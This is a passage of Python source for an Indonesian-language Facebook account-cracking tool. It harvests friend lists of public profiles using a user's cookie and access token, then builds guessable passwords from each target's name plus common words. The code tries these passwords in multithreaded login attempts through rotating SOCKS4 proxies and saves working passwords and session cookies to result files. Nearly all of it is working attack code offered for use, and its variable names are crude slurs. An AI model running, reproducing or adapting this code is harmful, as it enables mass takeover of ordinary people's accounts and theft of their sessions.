{W}   | |___{P}Userid     : {U}{___nano___userid___}
{W}   | |___{P}User Ttl   : {U}{___nano___ttl___}
{W}   |   |
{W}   |___|_{P}Ipaddres   : {K}{___nano___IP___}
{W}       | |___{P}Negara : {K}{___nano___negara___}
{W}       |
{W}       |_____{P}Author : {I}Jeeck X Nano
{W}         |___{P}Github : {I}https://github.com/Jeeck-XD

{P}[{K}01{P}] Crack dari pertemanan dan publik
{P}[{K}02{P}] Crack dari pertemanan dan publik {M}masall
{P}[{K}03{P}] Lihat hasil crack
{P}[{K}04{P}] Log Out accounts {M}Exit\n""")
	asu = input(f"{P}[{K}•{P}] Masukan pilihan : {W}")
	if asu in ["1", "01"]:
		publik_satu() # <========== CRACK PUBLIK
	elif asu in ["2", "02"]:
		publik_dua() # <========== CRACK PUBLIK MASAL
	elif asu in ["3", "03"]:
		result() # <========== CHECK RESULTS
	elif asu in ["4", "04"]:
		os.system("rm -rf token.txt");os.system("rm -rf .cookie.txt");exit()
	else:
		print(f"""\n{P}[{K}•{P}] Input yang anda masukan salah harap input ulang :V""");menu()
def ___ubah___id___(link): #<========= CONVERT ID
	if 'facebook' in str(link):user = link.split("/")[3]
	else:user = link
	cookie = {"cookie":open("cookie.txt","r").read()}
	url = 'https://mbasic.facebook.com/' + user
	try:
		req = parser(ses.get(url,cookies=cookie).content,'html.parser')
		kut = req.find('a',string='Lainnya')
		id = str(kut['href']).split('=')[1]
		return(id)
	except:return(link)
def convert_id(user): #<========= CONVERT ID V2
	payload = {"fburl": "https://free.facebook.com/{user}", "check": "Lookup"}
	if "facebook" in user:
		payload = {"fburl": user, "check": "Lookup"}
	url = parser(ses.post("https://lookup-id.com/", data=payload).content,"html.parser")
	data = url.find("span", id="code")
	idt = data.text
	return idt
def publik_satu(): #<========= GET ID PUBLIK
	try:
		_colmek_ = open('cookie.txt','r').read()
		_kontol_ = open('token.txt','r').read()
		_memek_ = {'cookie':_colmek_}
	except IOError:
		print(f"\n{P}[{K}•{P}]{M} Cookie mungkin mengalami kadaluarsa ");exit()
	print(f"""\n{P}[{K}•{P}] Harap memasukan user yang bersifat publik
{P}[{K}•{P}] Jika tidak akan terjadi eror terhadap tools
{P}[{K}•{P}] Masukan "{W}Me{P}" untuk dump id diri sendiri\n""")
	user = input(f"{P}[{K}•{P}] Masukan id : {W}")
#	if(re.findall("\w+",user)):akun = ___ubah___id___(user)
#	else:akun = user
	akun = user
	try:
		bas = ses.get(f'https://{graph}/{akun}?fields=friends.fields(id,name,username)&access_token={_kontol_}',cookies=_memek_).json()
		for pi in bas['friends']['data']:
			try:
				try:id.append(pi['username']+'|'+pi['name'])
				except:id.append(pi['id']+'|'+pi['name'])
				print(f"\r{P}[{K}•{P}] Proses dump id %s[%s%s%s] %s<-----> %s%s           "%(P,W,len(id),P,W,I,pi['name']),end='')
				sys.stdout.flush()
			except:continue
	except Exception as e:
		print(f"\n{P}[{K}•{P}]{M} Terjadi eror di toole akun mati atau bersifat privat ");time.sleep(2);exit()
	tur_atur_tur()
def publik_dua(): #<========= CRACK MASSAL
	bz = 0
	try:
		_colmek_ = open('cookie.txt','r').read()
		_kontol_ = open('token.txt','r').read()
		_memek_ = {'cookie':_colmek_}
	except IOError:
		print(f"""\n{P}[{K}•{P}]{M} Mungkin cookies anda telah modar """);exit()
	print(f"""\n{P}[{K}•{P}] Crack menggunakan id kali lipat ??
{P}[{K}•{P}] Max 5 id untuk di crack
{P}[{K}•{P}] Dan pastikan id yang anda masukan bersifat publik\n""")
	try:apa = int(input(f"{P}[{K}•{P}] Masukan jumlah : {W}"))
	except:apa = 1
	for bz in range(apa):
		bz += 1
		if '6' in str(bz):tur_atur_tur()
		user = input(f"\r{P}[{K}•{P}] Masukan id yang ke {P}[{W}{bz}{P}] : {W}")
		if(re.findall("\w+",user)):akun = ___ubah___id___(user)
		else:akun = user
		try:
			for pi in ses.get(f'https://{graph}/{akun}?fields=friends.fields(id,name,username)&access_token={_kontol_}',cookies=_memek_).json()['friends']['data']:
#ses.get(f'https://graph.facebook.com/v1.0/{akun}?fields=friends.fields(name,username,id)&access_token={_kontol_}',cookies=_memek_).json()
				try:id.append(pi['username']+'|'+pi['name'])
				except:id.append(pi['id']+'|'+pi['name'])
				print(f"\r{P}[{K}•{P}] Proses dump id %s[%s%s%s] %s<-----> %s%s        "%(P,W,len(id),P,W,I,pi['name']),end='')
				sys.stdout.flush()
		except:
			print(f"\n\r{P}[{K}•{P}] Akun bersifat tidak publik / akun mati ");exit()
			continue
	tur_atur_tur()
def tampil_hasil():
	global prog,des
	print(f"""
{P}[{K}•{P}] Results accounts {I}OK {O}{memek} 
{P}[{K}•{P}] Results accounts {K}CP {M}{pentil}
{P}[{K}•{P}] Mainkan mode pesawat pada saat crack\n""")
	prog = Progress(SpinnerColumn('smiley'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=25) as pool:
			for NANO in id2:
				idf,___nano___ = NANO.split('|')[0],NANO.split('|')[1].lower()
				___jeeck___gtg____ = ___nano___.split(' ')[0]
				____jeeck_x_nano____ = []
				if len(___nano___)<6:
					if len(___jeeck___gtg____)<3:
						pass
					else:
						____jeeck_x_nano____.append(___jeeck___gtg____+'123')
						____jeeck_x_nano____.append(___jeeck___gtg____+'1234')
						____jeeck_x_nano____.append(___jeeck___gtg____+'12345')
						____jeeck_x_nano____.append("katasandi")
						____jeeck_x_nano____.append("indonesia")
						____jeeck_x_nano____.append("bismillah")
						____jeeck_x_nano____.append("sayang")
						____jeeck_x_nano____.append("anjing")
				else:
					if len(___jeeck___gtg____)<3:
						____jeeck_x_nano____.append(___nano___)
						____jeeck_x_nano____.append("katasandi")
						____jeeck_x_nano____.append("indonesia")
						____jeeck_x_nano____.append("bismillah")
						____jeeck_x_nano____.append("sayang")
						____jeeck_x_nano____.append("anjing")
					else:
						____jeeck_x_nano____.append(___nano___)
						____jeeck_x_nano____.append(___jeeck___gtg____+'123')
						____jeeck_x_nano____.append(___jeeck___gtg____+'1234')
						____jeeck_x_nano____.append(___jeeck___gtg____+'12345')
						____jeeck_x_nano____.append("katasandi")
						____jeeck_x_nano____.append("indonesia")
						____jeeck_x_nano____.append("bismillah")
						____jeeck_x_nano____.append("sayang")
						____jeeck_x_nano____.append("anjing")
						____jeeck_x_nano____.append("kontol")
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						____jeeck_x_nano____.append(xpwd)
				else:pass
				if 'mbasic' in method:
					pool.submit(crackmbasic,idf,____jeeck_x_nano____)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,____jeeck_x_nano____)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,____jeeck_x_nano____)
				else:
					pool.submit(crackmbasic,idf,____jeeck_x_nano____)
		print(f"\nTools Selesai")
def tur_atur_tur(): # <========== BUAT TAMPILAN SETING ID
	print(f"""\n
{P}[{W}01{P}] Crack dari urutan id tertua
{P}[{W}02{P}] Crack dari urutan id termuda
{P}[{W}03{P}] Crack dari urutan id random {I}Recomended\n""")
	nano__gtg = input(f"{P}[{K}•{P}] Masukan pilihan : {W}")
	if nano__gtg in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif nano__gtg in ['2','02']:
		muda=[]
		for nanoooo in sorted(id):
			muda.append(nanoooo)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif nano__gtg in ['3','03']:
		for nanoooo in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,nanoooo)
	else:
		jalan(f"\n{P}[{K}•{P}]{M} Maaf input harus angka doank");exit()
	print(f"""
{P}[{W}01{P}] Method free facebook
{P}[{W}02{P}] Method Mbasic facebook
{P}[{W}03{P}] Method Mobile facebook\n""")
	__kon__ = input(f"{P}[{K}•{P}] Masukan Pilihan : {W}")
	if __kon__ in [""]:
		jalan(f"\n{P}[{K}•{P}]{M} Masukan dengan benar babi");tur_atur_tur()
	elif __kon__ in ["1", "01"]:
		method.append("mbasic")
	elif __kon__ in ["2", "02"]:
		method.append("mbasic")
	elif __kon__ in ["3", "03"]:
		method.append("mbasic")
	else:
		method.append('mbasic')
	pwplus = input(f"\n{P}[{K}•{P}] Gunakan password Defaults/Manual [D/M] : {W}")
	if pwplus in ['m','M']:
		pwpluss.append('ya')
		pwku=input(f"\n{P}[{K}•{P}] Buat Password : {W}")
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	ganti.append("no")
	tampil_hasil()
########## MBASIC ##########
def crackmbasic(idf,____jeeck_x_nano____):
	global loop,ok,cp
	nip=random.choice(prox)
	proxs= {'http': 'socks4://'+nip}
	ses = requests.Session()
	prog.update(des,description=f'[deep_pink3]{(loop)}/{len(id)}[/] [green]OK[/]/[yellow]CP[/] – [green]{(ok)}[/]/[yellow]{(cp)}')
	prog.advance(des)
	for pw in ____jeeck_x_nano____:
		try:
			ua = "Mozilla/5.0 (Linux; U; Android 10; ru-ru; Redmi 9C NFC Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.6.0-gn"
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Linux; U; Android 10; ru-ru; Redmi 9C NFC Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.6.0-gn','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','accept-language': 'en-US,en;q=0.5','accept-charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={
					"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
					"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
					"uid":idf,
					"next":"https://mbasic.facebook.com/login/save-device/",
					"flow":"login_no_pin",
					"pass":pw,
				}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Linux; U; Android 10; ru-ru; Redmi 9C NFC Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.6.0-gn','x-requested-with': 'XMLHttpRequest','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="86"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','origin': 'https://developer.facebook.com/','accept-encoding': 'gzip, deflate, br','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','accept-language': 'en-US,en;q=0.5','accept-charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f"\r{K}{idf} | {pw}")
				open('CP/'+pentil,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				ua = "Mozilla/5.0 (Linux; U; Android 10; ru-ru; Redmi 9C NFC Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.6.0-gn"
				print(f"\r{I}{idf} | {pw} | {kuki}")
				open('OK/'+memek,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				ok+=1
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1
def convert(cookie): #<========= CONVERT COOKIE :V
	cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	return(str(cok))
def result(): #<========= CHEK FILE CP DAN OK
	print(f"""
{P}[{W}01{P}] Check results accounts ok
{P}[{W}02{P}] Check results accounts cp
{P}[{W}03{P}] Back to menu \n""")
	____JEMBUT___ = input(f"{P}[{K}•{P}] Masukan pilihan : {W}")
	if ____JEMBUT___ in ['1']: #<========= CHEK RESULTS OK
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(f"\n{P}[{K}•{P}]{M} File not found");exit()
		if len(vin)==0:
			print(f"\n{P}[{K}•{P}]{M} File not results");exit()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10000:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f"{P}[{W}{nom}{P}] {I}{isi} {U}{len(hem)}")
				else:
					lol.update({str(cih):str(isi)})
					print(f"{P}[{W}{nom}{P}] {I}{isi} {U}{len(hem)}")
			geeh = input(f"\n{P}[{K}•{P}] Pilih nomor : {W}")
			try:geh = lol[geeh]
			except KeyError:
				print(f"\n{P}[{K}•{P}]{M} Input yang anda masukan salah");exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(f"\n{P}[{K}•{P}]{M} File not found");exit()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f"{U}--------> {I}{cpkuni[0]}|{cpkuni[1]}");time.sleep(0.03)
				nocp +=1
			input(f"\n{P}[{K}•{P}] Cek selesai tekan enter");exit()
	elif ____JEMBUT___ in ['2']: #<========= CHECK RESULTS CP
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(f"\n{P}[{K}•{P}]{M} File not found");exit()
		if len(vin)==0:
			print(f"\n{P}[{K}•{P}]{M} File not results");exit()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10000:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f"{P}[{W}{nom}{P}] {I}{isi} {U}{len(hem)}")
				else:
					lol.update({str(cih):str(isi)})
					print(f"{P}[{W}{nom}{P}] {I}{isi} {U}{len(hem)}")
			geeh = input(f"\n{P}[{K}•{P}] Masukan nomor : {W}")
			try:geh = lol[geeh]
			except KeyError:
				print(f"\n{P}[{K}•{P}]{M} Input yang anda masukan salah");exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(f"\n{P}[{K}•{P}]{M} File not found");exit()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f"{U}--------> {K}{cpkuni[0]}|{cpkuni[1]}");time.sleep(0.03)
				nocp +=1
			input(f"\n{P}[{K}•{P}] Cek selesai tekan enter");exit()
	elif ____JEMBUT___ in ['3']:
		menu() #<========= KEMBALI KE MENU TOOLS
if __name__=='__main__':
	menu() #<========= MAIN TO MAIN :V

# OPEN SOURCE BY JEECK X NANO
